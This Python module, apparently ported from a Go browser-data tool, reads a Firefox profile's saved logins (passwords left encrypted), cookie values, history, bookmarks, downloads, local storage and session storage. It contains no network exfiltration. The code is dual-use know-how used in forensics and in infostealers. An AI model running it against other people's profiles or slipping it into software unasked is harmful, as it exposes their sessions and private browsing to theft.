"""
Firefox data extractors
"""
import sqlite3
import json
import os
from typing import List, Dict, Any, Optional
from extractors.chromium_extractors import BaseExtractor
from core.types import DataType
from utils.crypto_utils import safe_sqlite_connect, time_epoch_to_datetime, clean_url

class FirefoxPasswordExtractor(BaseExtractor):
    """Extract passwords from Firefox"""
    
    def __init__(self):
        super().__init__(DataType.FIREFOX_PASSWORD)
    
    def extract(self, file_path: str, master_key: bytes = None) -> List[Dict[str, Any]]:
        """Extract passwords from logins.json file"""
        self.data = []
        
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                logins_data = json.load(f)
            
            logins = logins_data.get('logins', [])
            
            for login in logins:
                try:
                    item = {
                        'hostname': clean_url(login.get('hostname', '')),
                        'username': login.get('encryptedUsername', ''),  # Would need NSS to decrypt
                        'password': '[ENCRYPTED]',  # Firefox passwords need NSS library to decrypt
                        'username_field': login.get('usernameField', ''),
                        'password_field': login.get('passwordField', ''),
                        'time_created': login.get('timeCreated', 0),
                        'time_last_used': login.get('timeLastUsed', 0),
                        'times_used': login.get('timesUsed', 0)
                    }
                    
                    if item['hostname']:  # Only add if has hostname
                        self.data.append(item)
                        
                except Exception:
                    continue
                    
        except Exception:
            pass
        
        return self.data

class FirefoxCookieExtractor(BaseExtractor):
    """Extract cookies from Firefox"""
    
    def __init__(self):
        super().__init__(DataType.FIREFOX_COOKIE)
    
    def extract(self, file_path: str, master_key: bytes = None) -> List[Dict[str, Any]]:
        """Extract cookies from cookies.sqlite file"""
        self.data = []
        
        conn = safe_sqlite_connect(file_path)
        if not conn:
            return self.data
        
        try:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT name, value, host, path, expiry, creationTime, isSecure, isHttpOnly
                FROM moz_cookies
                ORDER BY creationTime DESC
                LIMIT 1000
            """)
            
            rows = cursor.fetchall()
            
            for row in rows:
                try:
                    item = {
                        'name': row[0] or "",
                        'value': row[1] or "",
                        'host': row[2] or "",
                        'path': row[3] or "",
                        'expires': time_epoch_to_datetime(row[4] or 0),
                        'created': time_epoch_to_datetime((row[5] or 0) / 1000000),  # Firefox uses microseconds
                        'is_secure': bool(row[6]),
                        'is_httponly': bool(row[7])
                    }
                    
                    if item['host'] and item['name']:  # Only add if has meaningful data
                        self.data.append(item)
                        
                except Exception:
                    continue
                    
        except sqlite3.Error:
            pass
        finally:
            conn.close()
        
        return self.data

class FirefoxHistoryExtractor(BaseExtractor):
    """Extract browsing history from Firefox"""
    
    def __init__(self):
        super().__init__(DataType.FIREFOX_HISTORY)
    
    def extract(self, file_path: str, master_key: bytes = None) -> List[Dict[str, Any]]:
        """Extract history from places.sqlite file"""
        self.data = []
        
        conn = safe_sqlite_connect(file_path)
        if not conn:
            return self.data
        
        try:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT p.url, p.title, p.visit_count, p.last_visit_date
                FROM moz_places p
                WHERE p.visit_count > 0
                ORDER BY p.last_visit_date DESC
                LIMIT 1000
            """)
            
            rows = cursor.fetchall()
            
            for row in rows:
                try:
                    item = {
                        'url': clean_url(row[0] or ""),
                        'title': row[1] or "",
                        'visit_count': row[2] or 0,
                        'last_visit_date': time_epoch_to_datetime((row[3] or 0) / 1000000)  # Firefox uses microseconds
                    }
                    
                    if item['url']:  # Only add if has URL
                        self.data.append(item)
                        
                except Exception:
                    continue
                    
        except sqlite3.Error:
            pass
        finally:
            conn.close()
        
        return self.data

class FirefoxBookmarkExtractor(BaseExtractor):
    """Extract bookmarks from Firefox"""
    
    def __init__(self):
        super().__init__(DataType.FIREFOX_BOOKMARK)
    
    def extract(self, file_path: str, master_key: bytes = None) -> List[Dict[str, Any]]:
        """Extract bookmarks from places.sqlite file"""
        self.data = []
        
        conn = safe_sqlite_connect(file_path)
        if not conn:
            return self.data
        
        try:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT p.url, p.title, b.title as bookmark_title, p.visit_count, b.dateAdded
                FROM moz_places p
                INNER JOIN moz_bookmarks b ON p.id = b.fk
                WHERE b.type = 1 AND p.url IS NOT NULL
                ORDER BY b.dateAdded DESC
                LIMIT 1000
            """)
            
            rows = cursor.fetchall()
            
            for row in rows:
                try:
                    item = {
                        'url': clean_url(row[0] or ""),
                        'title': row[1] or row[2] or "",  # Use page title or bookmark title
                        'bookmark_title': row[2] or "",
                        'visit_count': row[3] or 0,
                        'date_added': time_epoch_to_datetime((row[4] or 0) / 1000000)  # Firefox uses microseconds
                    }
                    
                    if item['url']:  # Only add if has URL
                        self.data.append(item)
                        
                except Exception:
                    continue
                    
        except sqlite3.Error:
            pass
        finally:
            conn.close()
        
        return self.data

class FirefoxDownloadExtractor(BaseExtractor):
    """Extract downloads from Firefox"""
    
    def __init__(self):
        super().__init__(DataType.FIREFOX_DOWNLOAD)
    
    def extract(self, file_path: str, master_key: bytes = None) -> List[Dict[str, Any]]:
        """Extract downloads from places.sqlite file"""
        self.data = []
        
        conn = safe_sqlite_connect(file_path)
        if not conn:
            return self.data
        
        try:
            cursor = conn.cursor()
            # Firefox stores downloads in annotations
            cursor.execute("""
                SELECT p.url, p.title, a.content, p.last_visit_date
                FROM moz_places p
                INNER JOIN moz_annos a ON p.id = a.place_id
                INNER JOIN moz_anno_attributes aa ON a.anno_attribute_id = aa.id
                WHERE aa.name = 'downloads/destinationFileName'
                ORDER BY p.last_visit_date DESC
                LIMIT 500
            """)
            
            rows = cursor.fetchall()
            
            for row in rows:
                try:
                    item = {
                        'url': clean_url(row[0] or ""),
                        'title': row[1] or "",
                        'filename': row[2] or "",
                        'download_time': time_epoch_to_datetime((row[3] or 0) / 1000000)
                    }
                    
                    if item['url'] and item['filename']:  # Only add if has URL and filename
                        self.data.append(item)
                        
                except Exception:
                    continue
                    
        except sqlite3.Error:
            pass
        finally:
            conn.close()
        
        return self.data

class FirefoxLocalStorageExtractor(BaseExtractor):
    """Extract local storage from Firefox (replicating Go implementation)"""
    
    def __init__(self):
        super().__init__(DataType.FIREFOX_LOCAL_STORAGE)
    
    def extract(self, file_path: str, master_key: bytes = None) -> List[Dict[str, Any]]:
        """Extract local storage from webappsstore.sqlite file"""
        self.data = []
        
        conn = safe_sqlite_connect(file_path)
        if not conn:
            return self.data
        
        try:
            cursor = conn.cursor()
            
            # Close journal mode like in Go version
            cursor.execute("PRAGMA journal_mode=off")
            
            # Query matches Go version exactly
            cursor.execute("""
                SELECT originKey, key, value 
                FROM webappsstore2
            """)
            
            rows = cursor.fetchall()
            
            for row in rows:
                try:
                    origin_key = row[0] or ""
                    key = row[1] or ""
                    value = row[2] or ""
                    
                    # Parse using same logic as Go's fillFirefox function
                    parsed_item = self._parse_firefox_storage(origin_key, key, value)
                    if parsed_item:
                        self.data.append(parsed_item)
                        
                except Exception:
                    continue
                    
        except sqlite3.Error:
            pass
        finally:
            conn.close()
        
        return self.data
    
    def _parse_firefox_storage(self, origin_key: str, key: str, value: str) -> Optional[Dict[str, Any]]:
        """Parse Firefox storage entry (replicating Go's fillFirefox function)"""
        try:
            # originKey format: "moc.buhtig.:https:443" (reversed domain)
            # Split by colon
            parts = origin_key.split(':')
            
            if len(parts) >= 2:
                # Reverse the first part (domain)
                reversed_domain = parts[0]
                # Reverse it back to normal (Go uses typeutil.Reverse)
                normal_domain = reversed_domain[::-1]
                
                # Remove leading dot if present
                if normal_domain.startswith('.'):
                    normal_domain = normal_domain[1:]
                
                # Reconstruct URL
                if len(parts) == 3:
                    # Format: protocol://domain:port
                    url = f"{parts[1]}://{normal_domain}:{parts[2]}"
                elif len(parts) == 2:
                    # Format: protocol://domain
                    url = f"{parts[1]}://{normal_domain}"
                else:
                    url = normal_domain
            else:
                url = origin_key
            
            return {
                'url': url,
                'key': key,
                'value': value,
                'origin_key': origin_key,  # Keep original for debugging
                'type': 'local_storage'
            }
            
        except Exception:
            # Fallback: return as-is if parsing fails
            return {
                'url': origin_key,
                'key': key,
                'value': value,
                'origin_key': origin_key,
                'type': 'local_storage'
            }

class FirefoxSessionStorageExtractor(BaseExtractor):
    """Extract session storage from Firefox"""
    
    def __init__(self):
        super().__init__(DataType.FIREFOX_SESSION_STORAGE)
    
    def extract(self, file_path: str, master_key: bytes = None) -> List[Dict[str, Any]]:
        """Extract session storage from sessionstore files"""
        self.data = []
        
        # Firefox session storage is typically stored in JSON files
        try:
            import os
            import json
            
            if os.path.isdir(file_path):
                # Look for sessionstore files
                session_files = []
                for file in os.listdir(file_path):
                    if 'sessionstore' in file.lower() and file.endswith(('.jsonlz4', '.json', '.js')):
                        session_files.append(os.path.join(file_path, file))
                
                for session_file in session_files[:3]:  # Limit to first 3 files
                    try:
                        # For .jsonlz4 files, we'd need lz4 decompression
                        # For now, handle regular JSON files
                        if session_file.endswith('.json'):
                            with open(session_file, 'r', encoding='utf-8') as f:
                                session_data = json.load(f)
                                
                                # Extract storage data from session
                                self._extract_session_storage(session_data, session_file)
                                
                    except Exception:
                        continue
                        
        except Exception:
            pass
        
        return self.data
    
    def _extract_session_storage(self, session_data: dict, source_file: str):
        """Extract storage data from session JSON"""
        try:
            # Navigate through session structure to find storage data
            if isinstance(session_data, dict):
                windows = session_data.get('windows', [])
                for window in windows:
                    if isinstance(window, dict):
                        tabs = window.get('tabs', [])
                        for tab in tabs:
                            if isinstance(tab, dict):
                                entries = tab.get('entries', [])
                                for entry in entries:
                                    if isinstance(entry, dict):
                                        storage = entry.get('storage', {})
                                        if storage:
                                            url = entry.get('url', '')
                                            for key, value in storage.items():
                                                item = {
                                                    'origin': clean_url(url),
                                                    'key': str(key),
                                                    'value': str(value)[:500],  # Limit value length
                                                    'source_file': os.path.basename(source_file),
                                                    'type': 'session_storage'
                                                }
                                                self.data.append(item)
        except Exception:
            pass
